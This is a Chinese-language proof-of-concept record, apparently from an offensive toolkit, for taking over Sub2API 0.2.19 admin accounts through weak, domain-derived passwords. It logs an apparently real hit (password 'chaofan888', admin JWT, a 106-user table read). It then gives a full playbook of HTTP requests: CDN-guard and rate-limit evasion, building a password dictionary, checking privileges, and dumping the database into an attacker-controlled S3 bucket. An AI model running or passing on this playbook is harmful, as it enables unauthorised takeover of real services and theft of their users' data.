# Sub2API 0.2.19 /api/v1/auth/login 管理员弱口令（站点域派生口令）→ 200 + role=admin JWT 完全接管管理面

- **code**: sub2api-admin-login-weak-password-domain-derived-jwt-takeove
- **kind**: poc
- **category**: weak-password
- **component**: Sub2API (Wei-Shaw/sub2api)
- **versions**: 0.2.19
- **severity**: critical
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#607 / 主机 i6403，2026-10-31 00:53-00:56 +08：Chrome UA、不带 XFF、3.5s/请求慢跑 87 条字典，第 25 条命中。POST https://target483.example.com/api/v1/auth/login {"email":"user@example.com","password":"chaofan888"} → HTTP 200 {"code":0,"message":"success","data":{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"rt_...","user":{"id":1,"role":"admin"}}}；JWT claims 明示 user_id=1、role=admin，响应无 requires_2fa。同 UA 复用 token：GET /api/v1/admin/users?page=1&page_size=3 → 200，total=106（字段 id/email/role/balance/concurrency/status/notes/last_used_at）；GET /api/v1/admin/backups → 200；GET /api/v1/admin/backups/s3-config → 200（全空，需自建 S3 才能触发 dump）。原始响应存于 hit_admin_cc_v6x8_com.json 与 tok.txt。
- **path**: pocs/sub2api-admin-login-weak-password-domain-derived-jwt-takeove/sub2api_admin_weak_password.md
- **tags**: sub2api,weak-password,admin,jwt,login,rate-limit,cdn-guard,no-2fa
- **created_at**: 2026-10-30T17:05:54.806Z
- **engine**: https://target483.example.com
- **found_by**: exploit

## 描述

Sub2API 管理端登录接口无验证码、无图形码、默认未启 TOTP，管理员邮箱即站点域派生（admin@<域名>），口令常为品牌短词+数字。命中后直接下发 HS256 管理员 JWT，可读全量用户表、备份/S3 配置、导出账号/代理/兑换码。仅需浏览器 UA 过 CDN 守卫、按真实出口 IP 限速慢跑。

## 用法

```
1) 指纹：GET / → 看 X-New-API / 前端 bundle 里的 sub2api 字样，或 GET /api/v1/setup、/api/v1/status 判版本；管理端 API 前缀恒为 /api/v1/{auth,admin}。
2) 关键前提：必须带浏览器 UA（如 Chrome/131），默认被 CDN _guard 拦；不要带 X-Forwarded-For（会触发 CDN 456）。
3) 限速按**真实出口 IP**计 ~20 次/分 → ≤3.5s/请求、单线程慢跑，别开并发。
4) 构造字典：email 固定 admin@<站点域>，password 用「品牌前缀 + 常见数字后缀」派生（如 <品牌>888 / <品牌>123 / <品牌>@2026 / <品牌>2025）。
5) 判据只看 HTTP 200 且 body code=0 且 data.access_token 存在、JWT claims role=admin；401/{code:非0,message:"邮箱或密码错误"} 为失败。
6) 命中后立即验证权限：GET /api/v1/admin/users?page=1&page_size=3（200 + total）。
7) 取数：GET /api/v1/admin/backups/s3-config 读备份存储配置；为空则需在自己的 S3 桶填入后触发 dump 再导出库。
8) 失败常见原因：忘了带 UA（403/456）、带了 XFF（456）、请求过快被限速、admin@ 猜错域名（用证书 SAN / 首页 mailto / 页面底部邮箱校正）。
```

## 正文

```
# Sub2API 管理端弱口令 → 管理员 JWT 接管

## 适用/前提
- 目标跑 Sub2API（Wei-Shaw/sub2api，本次为 0.2.19），管理端 API 前缀 `/api/v1/`。
- 登录接口 `/api/v1/auth/login` 接受 `email + password` JSON：
  无验证码、无图形码、默认**未启用 TOTP**（命中时响应不含 `requires_2fa`）。
- 管理员邮箱可猜：默认管理员就是 `admin@<站点主域名>`。
- 口令来自站点品牌派生短词 + 常见数字后缀（本次 `chaofan888`）。

## 关键环境约束（踩过的坑）
| 约束 | 原因 | 处理 |
|---|---|---|
| 必须带浏览器 UA | 前置 CDN 有 `_guard` 校验 | 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/192.0.2.4 Safari/537.36` |
| **不要**带 `X-Forwarded-For` | 带了会被 CDN 判异常 | 全流程不自定义 XFF 头 |
| 限速按真实出口 IP 计 ≈20 次/分 | 登录接口限流 | 单线程 ≤3.5s/请求慢跑，别并发 |

## 步骤 1：命中（第 25 条口令）
```http
POST /api/v1/auth/login HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36
Content-Type: application/json

{"email":"admin@<domain>","password":"<brand>888"}
```
成功回显：
```http
HTTP/1.1 200 OK
{"code":0,"message":"success","data":{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"rt_...","token_type":"Bearer","user":{"id":1,"email":"admin@<domain>","role":"admin"}}}
```
JWT claims 解码后可见 `user_id:1`、`role:"admin"`、`token_version`。

## 步骤 2：证明权限真实
```http
GET /api/v1/admin/users?page=1&page_size=3 HTTP/1.1
Host: <target>
Authorization: Bearer <access_token>
User-Agent: <同上 Chrome UA>
```
→ `200 {"code":0,"data":{"items":[{"id":234,"email":"...","role":"user"}],"total":106,"page":1}}`

## 步骤 3：摸备份/导出面（拿库的另一条路）
```http
GET /api/v1/admin/backups          # 备份列表
GET /api/v1/admin/backups/s3-config # 备份存储配置（endpoint/region/bucket/access_key_id/prefix）
```
路由由源码 `routes/target482.example.com:644` 确认。若 s3-config 全空 → 无现成备份可下，
需把自有 S3 桶填进去再触发 dump，才能把业务库导出成文件。

## 判据
- 命中：HTTP 200 + `code:0` + 有 `data.access_token`，且 claims `role=admin`。
- 失败：401 或 `code!=0`（口令错）。域名错/UA 缺/限速都会伪装成失败，先排环境再加字典。

## 字典建议
password 侧按 `<品牌短词><后缀>` 生成：`888`、`123`、`1234`、`2025`、`2026`、`@2026`、`ab123456`；
email 侧固定 `admin@<域>`，并可加 `root@`、`system@`。总量压在 ~100 条内，按 20/分算约 5 分钟。
```
